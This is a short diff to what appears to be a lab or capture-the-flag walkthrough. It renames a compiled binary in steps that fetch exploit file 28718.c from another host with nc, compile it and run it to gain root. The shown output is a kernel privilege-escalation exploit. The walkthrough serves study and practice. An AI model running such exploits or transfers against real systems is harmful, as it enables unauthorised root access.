@@ -349,16 +349,16 @@ nc 10.101.55.75 6666 > 28718.c
 Compile and execute exploit.
 
 ```
-gcc 28718.c -o hack
-./hack
+gcc 28718.c -o priv
+./priv
 ```
 
 Now, I'm root.
 
 ```
-gcc 28718.c -o a
+gcc 28718.c -o priv
 28718.c:178:2: warning: no newline at end of file
-./a
+./priv
 [+] SYSRET FUCKUP!!
 [+] Start Engine...
 [+] Crotz...
